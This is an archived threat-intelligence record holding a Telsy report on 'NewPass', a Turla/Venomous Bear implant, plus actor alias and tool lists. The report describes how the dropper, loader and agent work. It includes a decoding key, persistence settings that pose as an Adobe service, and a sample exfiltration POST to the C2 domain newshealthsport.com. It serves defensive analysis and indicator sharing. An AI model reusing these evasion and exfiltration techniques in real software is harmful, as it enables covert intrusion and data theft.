{
    "id": "51acb2ba-9fdb-4019-937b-05527f4acb1f",
    "created_at": "2022-10-25T16:48:15.409713Z",
    "updated_at": "2025-03-27T02:16:20.627089Z",
    "deleted_at": null,
    "sha1_hash": "19cf361089a302524207249a3c86c2a390ce19a4",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-07-23T01:54:31Z",
    "file_modification_date": "2020-07-23T01:54:31Z",
    "file_size": 1517773,
    "plain_text": "# Turla / Venomous Bear updates its arsenal: “NewPass” appears on the APT threat scene\n\n**[telsy.com/turla-venomous-bear-updates-its-arsenal-newpass-appears-on-the-apt-threat-scene](https://www.telsy.com/turla-venomous-bear-updates-its-arsenal-newpass-appears-on-the-apt-threat-scene/)**\n\nwebmaster@telsy.com July 14, 2020\n\nRecently Telsy observed some artifacts related to an attack that occurred in June 2020\nthat is most likely linked to the popular Russian Advanced Persistent Threat (APT) known\nas Venomous Bear (aka Turla or Uroburos). At the best of our knowledge, this time\nthe hacking group used a previously unseen implant, that we internally named\n“NewPass“ as one of the parameters used to send exfiltrated data to the command and\ncontrol.\n\nTelsy suspects this implant has been used to target at least one European Union country\nin the sector of diplomacy and foreign affairs.\n\n**_NewPass is quite a complex malware composed by different components that rely on an_**\nencoded file to pass information and configuration between each other. There are at least\nthree components of the malware: a dropper, that deploys the binary file; a loader library,\n\n\n-----\n\nthat is able to decode the binary file extracting the last component, responsible for\nperforming specific operations, such as communicate with the attackers’ command and\ncontrol server (the “agent”)\n\nThe loader and the agent share a JSON configuration resident in memory that\ndemonstrate the potential of the malware and the ease with which the attackers can\ncustomize the implant by simply changing the configuration entries’ values.\n\n## Dropper Analysis\n\nThe first Windows library has a huge size, about 2.6 MB, and it is identified by the\nfollowing hash:\n\n**Type** **Value**\n\nSHA256 e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078\n\nExploring the artifact using a static approach, it is possible to note that it exports a high\nnumber of functions, as shown in the following image.\n\nMost of the reported functions point to useless code and only LocalDataVer can be\nused as an entry point of the DLL, therefore making it useful to understand the malicious\nbehavior.\n\nAttackers used this trick likely to avoid sandbox analysis, as well as make manual analysis\nslightly harder. Sandbox solutions, in fact, probably will try to execute a DLL file\nusing rundll32.exe or regsvr32.exe utilities, using “DllMain” or\n“DllRegisterServer” as an entrypoint function. In this case, both these functions cause\nthe termination of the program, without showing the real malware behavior.\n\nThe library’s aim is to deploy the backdoor and its configuration file under two different\nfolders depending on attacker’s customization.\n\n\n-----\n\nAccording to what has been observed by our research team, the paths used in this case are\nthe following:\n\n**Configuration Path** **Backdoor Path**\n\nProgramData\\Adobe\\ARM\\Reader_20.021.210_47.dat C:\\Program Files\n(x86)\\Adobe\\Acrobat Reader\nDC\\Reader\\lib3DXquery.dll\n\n\nProgramData\\WindowsHolographic\\SpatialStore\\Holo\ngraphicSpatialStore.swid\n\n\nWindowsHolographicService.dll\n\n\nFor the second sample we weren’t able to retrieve its dropper. Therefore, it is possible to\nobtain the location of the configuration file from which the backdoor tried to load the\nparameters, but not the exact location in which the dropper deployed the implant artifact.\n\nFurthermore, the used paths are very stealthy and it is easy to confuse the artifacts as\ncomponents of legitimate programs, such as Adobe Reader or Windows Mixed\n**Reality.**\n\nIn particular, the path of the first sample is the same used by the legitimate Adobe Reader\ninstallation and therefore the lib3DXquery.dll file matches up perfectly with the other\nAdobe components, making it almost totally invisible.\n\nThe configuration file written, at first glance, seems to be totally encrypted and\nincomprehensible without analyzing the next stage. The following image shows the\nconfiguration file in its raw form.\n\n\n-----\n\n## Loader Analysis\n\nThe retrieved backdoor implants are identified by the following hashes:\n\n**Name** **SHA256**\n\nlib3DXquery.dll 6e730ea7b38ea80f2e852781f0a96e0bb16ebed8793a5ea4902e94c594bb6ae0\n\n\nWindowsHolographicService.dll\n\n\nf966ef66d0510da597fec917451c891480a785097b167c6a7ea130cf1e8ff514\n\n\nOnce again, the libraries export several functions but only one is useful to execute their\nreal payload.\n\n\n-----\n\nTo begin, the library checks the presence of the associated configuration file, if it does not\nexist, the backdoor terminates its execution. Vice versa, once found the file the malware\nstarts to decode and read the current configuration.\n\nThe first 5 bytes of the file contains the size of the data to read starting from\nthe 6th **bytes and which contains the first encoded information useful to allow the**\nmalware to load the entire configuration.\n\nAll the data retrieved in this first phase is encoded using a simple XOR algorithm with a\nfixed key 19 B9 20 5A B8 EF 2D A3 73 08 C1 53, hardcoded at the beginning of the\nfunction as represented in the following image.\n\n\n-----\n\nSo, the malware reads the first 5 bytes and decodes it using the key, obtaining the\nnumber of the bytes it has to read to obtain the initial configuration.\n\nIn this specific case, from the decoded bytes it gets the value 00081.\n\nSo, it proceeds to read other next 81 bytes.\n\n\n-----\n\nDecoding these last ones with the usual key, it obtains a string composed by different\nparameters separated by “||”, as illustrated below.\n\nHowever, this is still not the final configuration used by the malware, but it contains only\nthe parameters to load the last malicious Windows library, named\n**_LastJournalx32.adf, containing the final agent._**\n\nThis payload is hidden into the configuration file after a section of random bytes used by\nthe attackers to change the hash value of the file at every infection.\n\nDuring its activity, the loader decrypts and maintains in memory the complete\nconfiguration used during the infection chain.\n\nIt consists of different JSON formatted structures that look like the following:\n\n\n-----\n\n_{_ _“RefreshToken”:””,_ _“NoInternetSleepTime”:”3600″,_ _“GetMaxSize”:”60000″,_\n_“ClientId”:””,_ _“DropperExportFunctionName”:”LocalDataVer”,_ _“Autorun”:”16″,_\n_“ImgurImageDeletionTime”:”120″,_ _“RecoveryServers”:[_ _],_ _“RunDllPath”:”%Win-_\n_Dir%\\\\System32″,_ **_“AgentLoaderExportFunctionName”:”LocalDataVer”,_**\n_“Key”:”[…redacted…]”,_ **_“AgentName”:”LastJournalx32.adf”,_** _“UserAgent”:””,_\n_[…truncated…]_\n\nThe structure contains all the information necessary for the loader to correctly launch the\nfinal agent. Some of these information are\n**_AgentFileSystemName, AgentExportName and AgentName._**\n\nThe agent shares the same memory space of the loader, thus it is able to access to the\nsame configuration and to extract the needed parameters, such as the object\nnamed Credentials. It also contains the domain name (newshealthsport[.]com) and\nthe path (/sport/latest.php) of the command-and-control with which the agent will\ncommunicate.\n\nFrom the configuration it is also possible to notice the version number of the malware,\nspecifically it is 19.03.28 for the AgentLoader and 19.7.16 for the Agent.\n\nMoreover, the agent is identified by an ID addressed by the AgentID entry that is used\nduring the communication with the C2 as identifier of the infected machine.\n\nThe configuration also embeds a specific structure for persistence mechanisms that\nappears as follow:\n\n_{_ _“Autoruns”: {_ _“Service”: {_ _“DisplayName”: “Adobe Update Module”,_\n_“ServiceName”: “Adobe Update Module”,       “Enabled”: “true”_ _},_\n_“TaskScheduler”: {_ _“Enabled”: “false”_ _},     “Registry”: {_ _“Enabled”:_\n_“false”_ _},     “Policies”: {_ _“Enabled”: “false”_ _}_ _}_ _}_\n\nThe implant supports different types of persistence mechanisms: through Service\n**_Manager, Task Scheduler, via Registry Key or using Windows GPO._**\n\nIn this specific case, attackers enabled the Service method that allows the malware to\ninteract with the SCManager to create a new service named Adobe Update\n**_Module pointing to the path of the loader._**\n\n## Agent Analysis\n\nThe last payload is identified by the following hash:\n\n**Type** **Value**\n\nSHA256 08a1c5b9b558fb8e8201b5d3b998d888dd6df37dbf450ce0284d510a7104ad7f\n\n\n-----\n\nIt is responsible for exfiltrating information from the infected machine, sending it to the\ncommand-and-control and downloading new commands to be executed.\n\nTo make the communication with the C2 stealthier, the agent uses a set of keywords to\nseparate the data within a POST request. The keywords are specified by attackers during\ndevelopment phase.\n\nIn the analyzed case, they are the following:\n\n_dbnew_\n_contentname_\n_newpass_\n_passdb_\n_data_src_\n_server_login_\n_table_data_\n_token_name_\n_server_page_\n_targetlogin_\n\nSo, during the exfiltration phase, the HTTP requests appear as reported in the table below\n\n_POST /sport/latest.php HTTP/1.1_ _Content-Type: application/x-www-form-urlen-_\n_coded_ _User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0)_\n_like Gecko_ _Host: newshealthsport. com_ _Content-Length: 170_ _Connection: Keep-_\n_Alive_ **_newpass=[redacted]&server_page=[redacted]&passdb=[redacted]&tar-_**\n**_getlogin=t&table_data=[redacted]_**\n\nAll the values embedded into the request are encrypted, probably using one of the keys\nembedded into the previous configuration. The algorithm used during the encryption\nphase is most probably a custom one.\n\nBelow, we report a simple scheme of the described infection chain, highlighting the three\ncomponents of this new threat: the dropper, the loader and the agent.\n\n\n-----\n\n## Persistence\n\nAs mentioned above, the malware is able to create services or tasks or to add registry keys\nto achieve persistence. In the analyzed case, the loader component is set to create a new\nWindows service, specifying its path location as ImagePath.\n\n## ATT&CK Matrix\n\n\n-----\n\n**Tech-**\n**nique**\n\n\n**Tactic** **Description**\n\n\nT1204 Execution Threat actor relies upon specific actions by a user in order to\ngain execution\n\n\nT1060 Persistence\n\nT1053 Persistence\n\nT1543 Persistence\n\nT1073 Defense\nEvasion\n\nT1132 Command and\ncontrol\n\nT1001 Command and\nControl\n\nT1041 Exfiltration\n\n\nThreat actor adds an entry to the “run keys” in the Registry or\nstartup folder to allow the program will be executed when a user\nlogs in\n\nThreat actor uses Windows Task Scheduler to schedule programs\nor scripts to be executed at a date and time\n\nAdversaries create or modify Windows services to repeatedly execute malicious payloads as part of persistence\n\nPrograms specifies DLLs that are loaded at runtime\n\nCommand and control (C2) information is encoded using a standard data encoding system\n\nCommand and control (C2) communications are hidden in an\nattempt to make the content more difficult to discover or\ndecipher\n\nThreat actor relies on command and control infrastructure to exfiltrate data\n\n\n## Indicators of Compromise\n\n**Type** **Value**\n\nSHA256 e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078\n\nSHA256 6e730ea7b38ea80f2e852781f0a96e0bb16ebed8793a5ea4902e94c594bb6ae0\n\nSHA256 08a1c5b9b558fb8e8201b5d3b998d888dd6df37dbf450ce0284d510a7104ad7f\n\nSHA256 f966ef66d0510da597fec917451c891480a785097b167c6a7ea130cf1e8ff514\n\nDomain newshealthsport. com\n\nURL http://newshealthsport. com/sport/latest.php\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.07.14_Turla_VENOMOUS_BEAR/Turla%20_%20Venomous%20Bear%20updates%20its%20arsenal_%20_NewPass_%20appears%20on%20the%20APT%20threat%20scene%20-%20Telsy.pdf"
    ],
    "report_names": [
        "Turla _ Venomous Bear updates its arsenal_ _NewPass_ appears on the APT threat scene - Telsy"
    ],
    "threat_actors": [
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1595469271,
    "ts_modification_date": 1595469271,
    "files": {
        "pdf": "https://archive.orkl.eu/19cf361089a302524207249a3c86c2a390ce19a4.pdf",
        "text": "https://archive.orkl.eu/19cf361089a302524207249a3c86c2a390ce19a4.txt",
        "img": "https://archive.orkl.eu/19cf361089a302524207249a3c86c2a390ce19a4.jpg"
    }
}